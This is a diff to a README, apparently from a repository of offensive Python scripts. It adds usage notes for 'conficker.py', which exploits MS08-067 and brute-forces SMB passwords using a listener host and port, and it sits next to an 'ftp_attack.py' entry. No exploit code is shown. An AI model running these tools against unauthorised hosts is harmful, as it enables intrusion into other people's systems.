@@ -72,6 +72,21 @@ $ python ftp_attack.py -H <target_hosts> -f <passwd_file> -r <redirect>
 * `passwd_file`: user/password file.
 * `redirect`: redirect page.
 
+### `conficker.py`:
+
+**Description** : Exploit the MS08_067 vulnerability and try brute force SMB.
+
+**Usage** :
+
+```
+$ python conficker.py -H <target_hosts> -l <listen_host> -p <listen_port> -f <passwd_file>
+```
+
+* `target_hosts`: IP address of the target(s).
+* `listen_host`: IP address of the listen/local host.
+* `listen_port`: listen/local port.
+* `passwd_file`: potential SMB passwords file.
+
 ## Requirements
 
 The following packages are also listed in `requirements.txt`:
